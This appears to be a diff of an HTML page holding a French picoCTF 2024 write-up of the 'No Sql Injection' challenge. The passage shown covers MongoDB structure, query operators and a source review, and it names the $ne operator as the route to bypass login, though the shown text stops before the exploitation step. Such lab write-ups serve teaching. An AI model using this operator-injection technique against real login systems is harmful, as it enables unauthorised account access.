-    td code, p code {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: .82em;
-      background: var(--surface2);
-      border: 1px solid var(--border);
-      border-radius: 4px;
-      padding: .1em .4em;
-      color: #c0cce8;
-    }
-
-    /* ── ATTACK CHAIN ── */
-    .chain {
-      display: flex;
-      flex-wrap: wrap;
-      align-items: center;
-      gap: .4rem;
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 8px;
-      padding: 1.1rem 1.3rem;
-      margin: 1rem 0 1.5rem;
-    }
-
-    .chain-node {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: .78rem;
-      color: var(--text);
-      background: var(--surface2);
-      border: 1px solid var(--border);
-      border-radius: 5px;
-      padding: .3rem .7rem;
-    }
-    .chain-arrow {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: .9rem;
-      color: var(--cyan);
-    }
-    .chain-node.highlight {
-      border-color: var(--cyan);
-      color: var(--cyan);
-      background: var(--cyan-dim);
-    }
-
-    /* ── BLOCKQUOTE ── */
-    blockquote {
-      background: #ff475709;
-      border-left: 3px solid var(--red);
-      border-radius: 0 6px 6px 0;
-      padding: .9rem 1.2rem;
-      margin: 1rem 0;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: .875rem;
-      color: var(--red);
-    }
-
-    /* ── RECS ── */
-    .rec-list { list-style: none; margin: .5rem 0; }
-    .rec-list li {
-      display: flex;
-      gap: .8rem;
-      align-items: flex-start;
-      padding: .9rem 0;
-      border-bottom: 1px solid var(--border);
-      color: #b8c3d9;
-    }
-    .rec-list li:last-child { border-bottom: none; }
-    .rec-num {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: .75rem;
-      color: var(--cyan);
-      background: var(--cyan-dim);
-      border: 1px solid var(--cyan);
-      border-radius: 4px;
-      padding: .1rem .5rem;
-      flex-shrink: 0;
-      margin-top: .1rem;
-    }
-
-    /* ── REFS ── */
-    .ref-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
-      gap: .8rem;
-      margin-top: 1rem;
-    }
-    .ref-card {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 8px;
-      padding: 1rem;
-      text-decoration: none;
-      display: flex;
-      flex-direction: column;
-      gap: .3rem;
-      transition: border-color .2s, box-shadow .2s;
-    }
-    .ref-card:hover {
-      border-color: var(--cyan);
-      box-shadow: 0 0 20px var(--cyan-glow);
-    }
-    .ref-icon {
-      font-size: 1.1rem;
-      margin-bottom: .2rem;
-    }
-    .ref-name {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: .8rem;
-      color: var(--cyan);
-      font-weight: 600;
-    }
-    .ref-url {
-      font-size: .75rem;
-      color: var(--muted);
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-    }
-
-    /* ── FLAG BOX ── */
-    .flag-box {
-      background: linear-gradient(135deg, #00d4aa0a 0%, #00d4aa03 100%);
-      border: 1px solid var(--cyan);
-      border-radius: 10px;
-      padding: 1.8rem 2rem;
-      text-align: center;
-      position: relative;
-      overflow: hidden;
-      margin: 1.5rem 0;
-    }
-    .flag-box::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background: radial-gradient(ellipse at 50% 0%, var(--cyan-glow) 0%, transparent 70%);
-      pointer-events: none;
-    }
-    .flag-label {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 10px;
-      letter-spacing: .2em;
-      text-transform: uppercase;
-      color: var(--muted);
-      margin-bottom: .8rem;
-    }
-    .flag-text {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 1.3rem;
-      font-weight: 700;
-      color: var(--cyan);
-      letter-spacing: .05em;
-      text-shadow: 0 0 20px var(--cyan-glow);
-    }
-
-    /* ── SHARE SECTION ── */
-    .share-section {
-      padding: 2rem 0;
-      border-top: 1px solid var(--border);
-      margin-top: 2rem;
-      display: flex;
-      flex-direction: column;
-      gap: 1rem;
-    }
-
-    .share-section .share-label {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 0.85rem;
-      color: var(--muted);
-      display: flex;
-      align-items: center;
-      gap: 0.5rem;
-    }
-
-    .share-buttons {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 0.8rem;
-    }
-
-    .share-btn {
-      display: inline-flex;
-      align-items: center;
-      gap: 0.5rem;
-      padding: 0.5rem 1rem;
-      border-radius: 99px;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 0.75rem;
-      border: 1px solid var(--border);
-      color: var(--text);
-      background: var(--surface);
-      cursor: pointer;
-      transition: all 0.2s;
-      text-decoration: none;
-    }
-    .share-btn:hover {
-      border-color: var(--cyan);
-      color: var(--cyan);
-      background: var(--cyan-dim);
-      box-shadow: 0 0 12px var(--cyan-glow);
-    }
-    .share-btn i { font-size: 1rem; }
-
-    /* ── FOOTER ── */
-    footer {
-      margin-top: 2rem;
-      padding: 2rem 0;
-      border-top: 1px solid var(--border);
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      flex-wrap: wrap;
-      gap: 1rem;
-    }
-    .footer-author {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: .8rem;
-      color: var(--muted);
-    }
-    .footer-author a {
-      color: var(--cyan);
-      text-decoration: none;
-    }
-    .footer-badge {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: .75rem;
-      color: var(--muted);
-      display: flex;
-      flex-direction: column;
-      align-items: flex-end;
-      gap: 0.2rem;
-    }
-    .footer-badge span { color: var(--cyan); }
-    .footer-date {
-      font-size: 0.7rem;
-      color: var(--muted);
-      opacity: 0.7;
-    }
-
-    /* ── SCROLLBAR ── */
-    ::-webkit-scrollbar { width: 6px; height: 6px; }
-    ::-webkit-scrollbar-track { background: var(--bg); }
-    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
-    ::-webkit-scrollbar-thumb:hover { background: var(--muted); }
-
-    /* ── RESPONSIVE ── */
-    @media (max-width: 640px) {
-      .sidebar { display: none; }
-      main { margin-left: 0; padding: 0 1.2rem 4rem; }
-      .hero-title { font-size: 1.8rem; }
-      footer { flex-direction: column; align-items: flex-start; }
-      .footer-badge { align-items: flex-start; }
-    }
-  </style>
+  @media (max-width: 900px) {
+    main { margin-left: 0; width: 100%; padding: 0 1.6rem 6rem; }
+    .sidebar { display: none; }
+    .mobile-nav { display: block; }
+  }
+  @media (max-width: 768px) {
+    .hero { padding: 4.5rem 0 3rem; }
+    .toc-list { grid-template-columns: 1fr; }
+    .glossary-grid { grid-template-columns: 1fr; }
+    .host-grid { grid-template-columns: 1fr 1fr; }
+    .ref-grid { grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); }
+  }
+  @media (max-width: 480px) {
+    body { font-size: 15px; }
+    main { padding: 0 1.1rem 6rem; }
+    .hero { padding: 4rem 0 2.5rem; }
+    .back-home { font-size: .72rem; padding: .5rem .8rem; }
+    .back-home span.label { display: none; }
+    .section { padding: 2.6rem 0 1.5rem; }
+    .section-title { margin-bottom: 1.1rem; }
+    .subsection-title { margin: 1.8rem 0 .7rem; font-size: .92rem; }
+    .terminal-bar-label { font-size: 10px; }
+    .code-wrap pre { font-size: .7rem; padding: .9rem .8rem; }
+    .def-box, .toc, .terminal-caption { padding: 1rem 1.1rem; }
+    .flag-box { padding: 1.3rem 1rem; }
+    .chain { padding: .9rem 1rem; gap: .35rem; }
+    .chain-node { font-size: .7rem; padding: .3rem .55rem; }
+    .host-grid { grid-template-columns: 1fr; }
+    footer { flex-direction: column; align-items: flex-start; }
+  }
+  @media (max-height: 480px) and (orientation: landscape) {
+    .mobile-nav { padding-bottom: calc(.4rem + var(--safe-b)); }
+    .mobile-nav-item { min-height: 36px; }
+  }
+  @media (min-width: 1400px) { .inner { max-width: 1020px; } }
+</style>
 </head>
 <body>
 
-<!-- SIDEBAR TIMELINE -->
+<div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+
+<a class="back-home" href="../index.html">
+  <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M9.5 3L4.5 8L9.5 13"/></svg>
+  <span class="label">Retour à l'accueil</span>
+</a>
+
 <nav class="sidebar">
   <div class="sidebar-line"></div>
-  <a class="phase-dot" href="#s1" title="Définition">01</a>
+  <a class="phase-dot" href="#s0" title="Challenge">00</a>
   <div class="sidebar-line"></div>
-  <a class="phase-dot" href="#s2" title="Architecture">02</a>
+  <a class="phase-dot" href="#s1" title="MongoDB">01</a>
   <div class="sidebar-line"></div>
-  <a class="phase-dot" href="#s3" title="Analyse">03</a>
+  <a class="phase-dot" href="#s2" title="Code source">02</a>
   <div class="sidebar-line"></div>
-  <a class="phase-dot" href="#s4" title="Exploit">04</a>
+  <a class="phase-dot" href="#s3" title="Recon">03</a>
   <div class="sidebar-line"></div>
-  <a class="phase-dot" href="#s5" title="Flag">05</a>
+  <a class="phase-dot" href="#s4" title="Théorie injection">04</a>
   <div class="sidebar-line"></div>
-  <a class="phase-dot" href="#s6" title="Sécurité">06</a>
+  <a class="phase-dot" href="#s5" title="Exploitation">05</a>
   <div class="sidebar-line"></div>
+  <a class="phase-dot" href="#s6" title="Flag">06</a>
+  <div class="sidebar-line"></div>
+  <a class="phase-dot" href="#s7" title="Sécurité">07</a>
+  <div class="sidebar-line"></div>
+</nav>
+
+<nav class="mobile-nav">
+  <div class="mobile-nav-scroll">
+    <a class="mobile-nav-item" href="#s0">00</a>
+    <a class="mobile-nav-item" href="#s1">01</a>
+    <a class="mobile-nav-item" href="#s2">02</a>
+    <a class="mobile-nav-item" href="#s3">03</a>
+    <a class="mobile-nav-item" href="#s4">04</a>
+    <a class="mobile-nav-item" href="#s5">05</a>
+    <a class="mobile-nav-item" href="#s6">06</a>
+    <a class="mobile-nav-item" href="#s7">07</a>
+  </div>
 </nav>
 
 <main>
 <div class="inner">
 
-  <!-- HERO -->
   <header class="hero">
-    <div class="hero-eyebrow">picoCTF 2024 · Web Exploitation · Write-up</div>
+    <div class="hero-eyebrow">picoCTF 2024 · Web Exploitation · Cours Technique Complet</div>
     <h1 class="hero-title">
-      <span class="dim">NoSQL</span><span class="accent">Injection</span><br>
-      <span class="dim" style="font-size:55%;">Authentification Bypass via MongoDB</span>
+      No <span class="accent">Sql</span> Injection<br>
+      <span class="dim" style="font-size:58%;">Comprendre et exploiter une faille MongoDB</span>
     </h1>
     <p class="hero-sub">
-      Exploitation d'une injection NoSQL sur une application Node.js + MongoDB —
-      contournement de l'authentification à l'aide de l'opérateur <code>$ne</code> et décodage Base64.
+      Write-up pédagogique complet : architecture MongoDB (documents, collections, BSON),
+      revue de code source, théorie des injections NoSQL, exploitation via l'opérateur
+      <code>$ne</code>, et bonnes pratiques de sécurisation. Chaque terme technique est défini.
     </p>
     <div class="meta-pills">
-      <span class="pill pill-cyan">MongoDB / Mongoose</span>
-      <span class="pill pill-red">Bypass Auth</span>
-      <span class="pill pill-amber">200 pts · Moyen</span>
-      <span class="pill pill-purple">NoSQL Injection</span>
+      <span class="pill pill-cyan">MongoDB / NoSQL</span>
+      <span class="pill pill-red">Auth Bypass</span>
+      <span class="pill pill-amber">200 pts · Medium</span>
+      <span class="pill pill-purple">Source Review</span>
+      <span class="pill pill-green">Burp Suite</span>
     </div>
-
-    <!-- Actions : Retour à l'accueil -->
-    <div class="hero-actions">
-      <a href="../index.html" class="pill pill-cyan">
-        <i class="fas fa-home"></i> Retour à l'accueil
-      </a>
-    </div>
-
     <div class="hero-divider"></div>
   </header>
 
-  <!-- 01 - DÉFINITION -->
-  <section class="section" id="s1">
-    <div class="section-label">Phase <span>01</span></div>
-    <h2 class="section-title">Qu'est-ce qu'une injection NoSQL ?</h2>
+  <div class="toc">
+    <div class="toc-title">Sommaire</div>
+    <ul class="toc-list">
+      <li><span class="toc-num">00</span><a href="#s0">Présentation du challenge</a></li>
+      <li><span class="toc-num">01</span><a href="#s1">MongoDB — architecture & stockage</a></li>
+      <li><span class="toc-num">02</span><a href="#s2">Analyse du code source</a></li>
+      <li><span class="toc-num">03</span><a href="#s3">Reconnaissance de l'application</a></li>
+      <li><span class="toc-num">04</span><a href="#s4">Théorie de l'injection NoSQL</a></li>
+      <li><span class="toc-num">05</span><a href="#s5">Exploitation — contournement d'authentification</a></li>
+      <li><span class="toc-num">06</span><a href="#s6">Extraction et décodage du flag</a></li>
+      <li><span class="toc-num">07</span><a href="#s7">Recommandations de sécurité</a></li>
+    </ul>
+  </div>
+
+  <!-- 00 - CHALLENGE -->
+  <section class="section" id="s0">
+    <div class="section-label">Phase <span>00</span></div>
+    <h2 class="section-title">Présentation du Challenge</h2>
 
     <p>
-      L'<strong>injection NoSQL</strong> est une vulnérabilité qui survient lorsqu'un attaquant parvient à
-      modifier la logique d'une requête vers une base de données non relationnelle (NoSQL) en injectant
-      des opérateurs ou des structures malveillantes dans les paramètres d'entrée.
-    </p>
-    <p>
-      Contrairement aux bases SQL classiques, les bases NoSQL (comme MongoDB) utilisent des requêtes sous forme
-      de documents (JSON/BSON) et des opérateurs spéciaux (comme <code>$ne</code>, <code>$gt</code>, <code>$regex</code>)
-      pour filtrer les données. Si l'application construit dynamiquement ces requêtes à partir des données
-      utilisateur sans validation, un attaquant peut altérer la sémantique de la requête.
+      <strong>No Sql Injection</strong> est un challenge Web Exploitation de picoCTF 2024,
+      créé par <strong>NGIRIMANA Schadrack</strong>, noté 200 points (difficulté moyenne).
+      Particularité notable : le code source complet de l'application est fourni au format
+      archive, ce qui transforme ce challenge en un exercice d'<strong>audit de code</strong>
+      autant que d'exploitation pure.
     </p>
 
     <div class="terminal-frame">
@@ -739,125 +393,272 @@
         <div class="t-dot t-dot-red"></div>
         <div class="t-dot t-dot-amber"></div>
         <div class="t-dot t-dot-green"></div>
-        <span class="terminal-bar-label">nosql_diagram.png — Principe de l'injection NoSQL</span>
+        <span class="terminal-bar-label">challenge_card.png — picoCTF</span>
       </div>
-      <img src="../no_sql_injection/nosql_diagram.png" alt="Schéma d'injection NoSQL" loading="lazy" />
-      <div class="terminal-caption">L'injection NoSQL modifie la condition de recherche pour contourner l'authentification</div>
+      <div class="img-scroll"><img src="assets/01_challenge.png" alt="Carte du challenge No Sql Injection sur picoCTF" loading="lazy"></div>
+      <div class="terminal-caption">No Sql Injection — Web Exploitation, Medium, 200 pts, picoCTF 2024. Source téléchargeable.</div>
     </div>
 
     <p>
-      Dans ce challenge, l'application utilise <strong>MongoDB</strong> via l'ODM <strong>Mongoose</strong>
-      sur une stack <strong>Node.js + Express</strong>. La vulnérabilité se situe dans la construction
-      de la requête de recherche de l'utilisateur lors de la connexion.
+      L'énoncé est direct : <em>"Can you try to get access to this website to get the flag?"</em>
+      — l'objectif est de contourner un mécanisme d'authentification. Le nom du challenge nous
+      indique déjà la famille de vulnérabilité à explorer : une injection dans une base de
+      données <strong>NoSQL</strong>, très probablement MongoDB étant donné son extrême
+      popularité dans l'écosystème JavaScript/Node.js.
     </p>
   </section>
 
-  <!-- 02 - ARCHITECTURE MONGODB -->
-  <section class="section" id="s2">
-    <div class="section-label">Phase <span>02</span></div>
-    <h2 class="section-title">Architecture de MongoDB et stockage des données</h2>
+  <!-- 01 - MONGODB ARCHITECTURE -->
+  <section class="section" id="s1">
+    <div class="section-label">Phase <span>01</span></div>
+    <h2 class="section-title">MongoDB — Architecture & Stockage des Données</h2>
 
     <p>
-      Pour bien comprendre l'attaque, il est essentiel de connaître les fondamentaux de MongoDB.
+      Avant d'attaquer quoi que ce soit, il faut comprendre precisément ce qu'est MongoDB et
+      comment il diffère fondamentalement d'une base de données relationnelle classique
+      (MySQL, PostgreSQL) — cette différence est justement à l'origine de toute la classe de
+      vulnérabilités que nous allons exploiter.
     </p>
 
-    <h3 class="subsection-title">2.1 — Modèle de données : documents BSON</h3>
-    <p>
-      MongoDB stocke les données dans des <strong>documents</strong> au format <strong>BSON</strong>
-      (Binary JSON). Un document est un ensemble de paires clé-valeur, similaire à un objet JSON.
-      Les documents sont regroupés dans des <strong>collections</strong> (l'équivalent des tables en SQL).
-    </p>
-    <p>
-      Exemple de document utilisateur :
-    </p>
-    <div class="code-wrap">
-      <div class="code-header">
-        <span class="code-lang">BSON — Document utilisateur</span>
-        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+    <div class="def-box">
+      <div class="def-term">MongoDB</div>
+      <div class="def-body">
+        Système de gestion de base de données <strong>NoSQL orienté documents</strong>, open
+        source, développé par MongoDB Inc. Contrairement aux bases relationnelles qui
+        organisent les données en tables rigides avec des colonnes fixes, MongoDB stocke
+        l'information sous forme de <strong>documents</strong> — des structures flexibles
+        similaires à des objets JSON — regroupés en <strong>collections</strong>.
       </div>
-      <pre>{
-  "_id": ObjectId("..."),
-  "email": "picoplayer355@picoctf.org",
-  "firstName": "pico",
-  "lastName": "player",
-  "password": "a1b2c3...",
-  "token": "cGljb0NURnt..."
-}</pre>
     </div>
 
-    <h3 class="subsection-title">2.2 — Opérateurs de requête</h3>
+    <h3 class="subsection-title">La hiérarchie de stockage MongoDB</h3>
+
     <p>
-      MongoDB propose des <strong>opérateurs de comparaison</strong> qui permettent de construire
-      des requêtes complexes. Parmi les plus courants :
+      MongoDB organise les données selon quatre niveaux hiérarchiques, du plus large au plus
+      spécifique :
     </p>
+
+    <div class="mongo-diagram">
+      <div class="mongo-level">
+        <div class="mongo-box deployment">
+          <div class="mongo-label">Niveau 1 — Déploiement</div>
+          <div class="mongo-name">mongod (instance serveur) / Cluster Atlas</div>
+          <div class="mongo-desc">Le processus serveur qui héberge et gère l'ensemble des bases de données. Peut être une instance unique ou un cluster répliqué.</div>
+        </div>
+        <div class="mongo-box database">
+          <div class="mongo-label">Niveau 2 — Database</div>
+          <div class="mongo-name">ex: picoctf_app_db</div>
+          <div class="mongo-desc">Un conteneur logique regroupant plusieurs collections liées à une même application.</div>
+        </div>
+        <div class="mongo-box collection">
+          <div class="mongo-label">Niveau 3 — Collection</div>
+          <div class="mongo-name">ex: users</div>
+          <div class="mongo-desc">L'équivalent d'une "table" en SQL, mais sans schéma fixe imposé par la base elle-même — chaque document peut théoriquement avoir des champs différents.</div>
+        </div>
+        <div class="mongo-box document">
+          <div class="mongo-label">Niveau 4 — Document</div>
+          <div class="mongo-name">{ email, password, token, ... }</div>
+          <div class="mongo-desc">L'équivalent d'une "ligne" en SQL — un objet structuré stocké au format BSON, identifié par un identifiant unique <code>_id</code>.</div>
+        </div>
+      </div>
+    </div>
+
+    <h3 class="subsection-title">BSON : le format de stockage réel</h3>
+
+    <div class="def-box">
+      <div class="def-term">BSON (Binary JSON)</div>
+      <div class="def-body">
+        Format binaire dans lequel MongoDB stocke physiquement chaque document sur le disque.
+        BSON est une extension binaire de JSON : il conserve la même structure conceptuelle
+        (clé/valeur, tableaux, objets imbriqués) mais ajoute des types de données supplémentaires
+        non natifs à JSON — dates, entiers 64 bits, identifiants binaires (<code>ObjectId</code>) —
+        et permet un parcours et une indexation beaucoup plus rapides qu'un texte JSON brut.
+      </div>
+    </div>
+
     <div class="table-wrap">
       <table>
         <thead>
-          <tr>
-            <th>Opérateur</th>
-            <th>Signification</th>
-            <th>Exemple d'utilisation</th>
-          </tr>
+          <tr><th>Concept SQL (relationnel)</th><th>Équivalent MongoDB (NoSQL)</th></tr>
         </thead>
         <tbody>
-          <tr>
-            <td><code>$eq</code></td>
-            <td>Égal à</td>
-            <td><code>{ "age": { "$eq": 25 } }</code></td>
-          </tr>
-          <tr>
-            <td><code>$ne</code></td>
-            <td>Différent de (<strong>N</strong>ot <strong>E</strong>qual)</td>
-            <td><code>{ "age": { "$ne": 30 } }</code></td>
-          </tr>
-          <tr>
-            <td><code>$gt</code></td>
-            <td>Supérieur à</td>
-            <td><code>{ "age": { "$gt": 18 } }</code></td>
-          </tr>
-          <tr>
-            <td><code>$regex</code></td>
-            <td>Correspondance avec une expression régulière</td>
-            <td><code>{ "name": { "$regex": "^pico" } }</code></td>
-          </tr>
+          <tr><td>Base de données</td><td>Database</td></tr>
+          <tr><td>Table</td><td>Collection</td></tr>
+          <tr><td>Ligne (row)</td><td>Document (BSON)</td></tr>
+          <tr><td>Colonne</td><td>Champ (field)</td></tr>
+          <tr><td>Clé primaire</td><td><code>_id</code> (ObjectId généré automatiquement)</td></tr>
+          <tr><td>Jointure (JOIN)</td><td>Référence manuelle ou document imbriqué (embedding)</td></tr>
+          <tr><td>Schéma fixe (obligatoire)</td><td>Schéma flexible, imposé uniquement côté application (ex: Mongoose)</td></tr>
         </tbody>
       </table>
     </div>
+
     <p>
-      Ces opérateurs sont normalement destinés à être utilisés dans des critères de recherche,
-      mais si l'application les accepte directement depuis l'entrée utilisateur, ils deviennent
-      une porte d'entrée pour l'injection.
+      C'est précisément ce dernier point — <strong>l'absence de schéma strict imposé par la
+      base elle-même</strong> — qui rend possible la classe d'attaques que nous allons voir :
+      MongoDB accepte volontiers des structures de requêtes complexes et imbriquées, y compris
+      des opérateurs de comparaison, sans distinction stricte entre "donnée" et "instruction"
+      si le code applicatif ne filtre pas correctement ce qu'il reçoit.
     </p>
 
-    <h3 class="subsection-title">2.3 — Services d'hébergement utilisés</h3>
+    <h3 class="subsection-title">Requêtage MongoDB : le langage des opérateurs</h3>
+
     <p>
-      Dans le cadre de ce challenge, l'instance utilise <strong>MongoDB Memory Server</strong>,
-      une bibliothèque qui crée une base de données MongoDB en mémoire vive. Cela permet de
-      fournir une base de données éphémère pour chaque instance sans avoir à déployer un serveur
-      MongoDB dédié.
+      MongoDB n'utilise pas de langage textuel comme SQL (<code>SELECT * FROM users WHERE...</code>).
+      Ses requêtes sont elles-mêmes des <strong>documents JSON/BSON</strong>, où certaines clés
+      spéciales préfixées par <code>$</code> agissent comme des <strong>opérateurs de requête</strong>.
     </p>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">JavaScript — Exemple de requête MongoDB native</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="cmt">// Recherche classique : trouver l'utilisateur avec cet email exact</span>
+db.users.findOne({ email: <span class="str">"bob@example.com"</span> })
+
+<span class="cmt">// Requête avec opérateur : trouver un utilisateur dont l'email N'EST PAS null</span>
+db.users.findOne({ email: { <span class="hl">$ne</span>: <span class="kw">null</span> } })</pre>
+    </div>
+
     <p>
-      En production réelle, les applications MongoDB sont souvent hébergées sur :
+      La seconde requête illustre le cœur du problème : la clé <code>$ne</code> ("not equal" —
+      différent de) n'est pas une donnée, c'est une <strong>instruction de comparaison</strong>
+      interprétée par le moteur MongoDB. Si une application transmet aveuglément une entrée
+      utilisateur dans une requête sans la valider, un attaquant peut injecter ce type
+      d'opérateur à la place d'une valeur attendue.
     </p>
-    <ul style="color:#b8c3d9; margin-left:1.5rem; list-style:disc;">
-      <li><strong>MongoDB Atlas</strong> : le service cloud officiel de MongoDB, offrant des bases de données gérées.</li>
-      <li><strong>Auto-hébergé</strong> : sur des serveurs dédiés ou des conteneurs Docker.</li>
-      <li><strong>Plateformes PaaS</strong> : comme Heroku, AWS, ou Google Cloud, qui proposent des add-ons MongoDB.</li>
-    </ul>
+
+    <h3 class="subsection-title">Où MongoDB est-il hébergé ? Les principaux services</h3>
+
     <p>
-      Ici, l'utilisation de <code>mongodb-memory-server</code> simplifie le déploiement pour le CTF
-      et évite les frais de serveur.
+      MongoDB peut être déployé de multiples façons, du serveur auto-hébergé au service
+      cloud entièrement managé. Voici les options les plus répandues dans l'industrie :
+    </p>
+
+    <div class="host-grid">
+      <div class="host-card">
+        <div class="host-icon">🍃</div>
+        <div class="host-name">MongoDB Atlas</div>
+        <div class="host-desc">Le service cloud officiel de MongoDB Inc. — entièrement managé, disponible sur AWS, Azure et GCP. Standard de facto pour la production.</div>
+      </div>
+      <div class="host-card">
+        <div class="host-icon">🟠</div>
+        <div class="host-name">AWS DocumentDB</div>
+        <div class="host-desc">Service managé d'Amazon compatible avec l'API MongoDB, intégré nativement à l'écosystème AWS.</div>
+      </div>
+      <div class="host-card">
+        <div class="host-icon">🔷</div>
+        <div class="host-name">Azure Cosmos DB</div>
+        <div class="host-desc">Base de données multi-modèle de Microsoft, proposant une API compatible MongoDB parmi plusieurs autres.</div>
+      </div>
+      <div class="host-card">
+        <div class="host-icon">🌊</div>
+        <div class="host-name">DigitalOcean Managed MongoDB</div>
+        <div class="host-desc">Offre managée simplifiée, populaire auprès des petites équipes et startups pour son rapport simplicité/coût.</div>
+      </div>
+      <div class="host-card">
+        <div class="host-icon">🐳</div>
+        <div class="host-name">Auto-hébergement (Docker / VPS)</div>
+        <div class="host-desc">Déploiement manuel via conteneur Docker ou installation directe sur un serveur — contrôle total, mais responsabilité de sécurisation entièrement à la charge de l'équipe.</div>
+      </div>
+      <div class="host-card">
+        <div class="host-icon">🧪</div>
+        <div class="host-name">mongodb-memory-server</div>
+        <div class="host-desc">Bibliothèque Node.js qui démarre une instance MongoDB <strong>en mémoire</strong>, sans persistance disque — utilisée pour les tests automatisés et, comme ici, pour des environnements CTF éphémères.</div>
+      </div>
+    </div>
+
+    <div class="warn-badge">Ce challenge utilise spécifiquement mongodb-memory-server — une base entièrement recréée en mémoire à chaque lancement d'instance, comme nous le confirmerons dans le code source</div>
+  </section>
+
+  <!-- 02 - CODE SOURCE -->
+  <section class="section" id="s2">
+    <div class="section-label">Phase <span>02</span></div>
+    <h2 class="section-title">Analyse du Code Source</h2>
+
+    <p>
+      Le challenge fournit une archive contenant l'intégralité du code de l'application.
+      On télécharge et extrait cette archive pour l'examiner directement — une démarche
+      appelée <strong>revue de code statique</strong> (static code review), bien plus fiable
+      que de deviner le comportement d'une application en boîte noire.
+    </p>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">Archive du code source extraite</span>
+      </div>
+      <div class="img-scroll"><img src="assets/02_source_archive.png" alt="Archive app.tar.gz extraite en dossier app" loading="lazy"></div>
+      <div class="terminal-caption">app.tar.gz extrait — dossier "app" contenant le code source complet du serveur</div>
+    </div>
+
+    <p>
+      À l'intérieur, on trouve un projet Node.js classique. Le fichier le plus important à
+      étudier est <code>server.js</code>, qui contient la logique métier de l'application —
+      c'est ici que se trouve potentiellement la faille.
+    </p>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">server.js — Extrait du code source</span>
+      </div>
+      <div class="img-scroll"><img src="assets/03_server_js.png" alt="Code source server.js avec Mongoose et schéma User" loading="lazy"></div>
+      <div class="terminal-caption">Express + Mongoose + MongoMemoryServer — schéma User avec champ token par défaut "{{Flag}}"</div>
+    </div>
+
+    <p>
+      Cet extrait révèle plusieurs informations capitales :
+    </p>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr><th>Élément du code</th><th>Signification</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><code>require("express")</code></td><td>Framework web Node.js utilisé pour gérer les routes HTTP</td></tr>
+          <tr><td><code>require("mongoose")</code></td><td><strong>Mongoose</strong> — un ODM (Object Document Mapper) qui simplifie l'interaction entre le code JavaScript et MongoDB</td></tr>
+          <tr><td><code>require("mongodb-memory-server")</code></td><td>Confirme l'usage d'une base MongoDB éphémère, entièrement en RAM, recréée à chaque redémarrage</td></tr>
+          <tr><td><code>userSchema</code></td><td>Définit la structure attendue d'un document utilisateur : email, prénom, nom, mot de passe, token</td></tr>
+          <tr><td><code>token: { default: "{{Flag}}" }</code></td><td><strong>Point clé</strong> — le flag du challenge est injecté dynamiquement comme valeur par défaut du champ token</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="def-box">
+      <div class="def-term">ODM (Object Document Mapper)</div>
+      <div class="def-body">
+        Bibliothèque qui fait le pont entre les objets JavaScript et les documents MongoDB,
+        équivalent d'un ORM pour les bases SQL. Mongoose permet de définir des
+        <strong>schémas</strong> (structure attendue, types, contraintes) au niveau applicatif
+        — mais attention : ces schémas ne bloquent pas nécessairement les opérateurs de requête
+        malveillants injectés dans les <em>filtres de recherche</em> (comme <code>findOne()</code>),
+        seulement la structure des documents <em>insérés</em>.
+      </div>
+    </div>
+
+    <p>
+      L'information la plus précieuse ici est la confirmation que le <strong>flag est stocké
+      directement dans la base de données</strong>, comme valeur du champ <code>token</code>
+      d'un utilisateur pré-enregistré. L'objectif devient donc clair : trouver un moyen de lire
+      ce document utilisateur sans connaître ses identifiants réels.
     </p>
   </section>
 
-  <!-- 03 - ANALYSE DE L'APPLICATION -->
+  <!-- 03 - RECON -->
   <section class="section" id="s3">
     <div class="section-label">Phase <span>03</span></div>
-    <h2 class="section-title">Analyse de l'application et du code source</h2>
+    <h2 class="section-title">Reconnaissance de l'Application</h2>
 
     <p>
-      En accédant à l'instance (via le lien fourni), on tombe sur une page de connexion classique
-      demandant un email et un mot de passe.
+      On accède à l'instance en ligne, qui présente un formulaire de connexion minimaliste —
+      sans indice visuel supplémentaire.
     </p>
 
     <div class="terminal-frame">
@@ -865,16 +666,15 @@
         <div class="t-dot t-dot-red"></div>
         <div class="t-dot t-dot-amber"></div>
         <div class="t-dot t-dot-green"></div>
-        <span class="terminal-bar-label">loginpages.png — Page de login</span>
+        <span class="terminal-bar-label">atlas.picoctf.net:54195 — Page de connexion</span>
       </div>
-      <img src="../no_sql_injection/loginpages.png" alt="Interface de login" loading="lazy" />
-      <div class="terminal-caption">Une simple page de connexion avec champs email et mot de passe</div>
+      <div class="img-scroll"><img src="assets/04_login_page.png" alt="Page de connexion vide du challenge" loading="lazy"></div>
+      <div class="terminal-caption">Formulaire de connexion standard — champs Email et Password</div>
     </div>
 
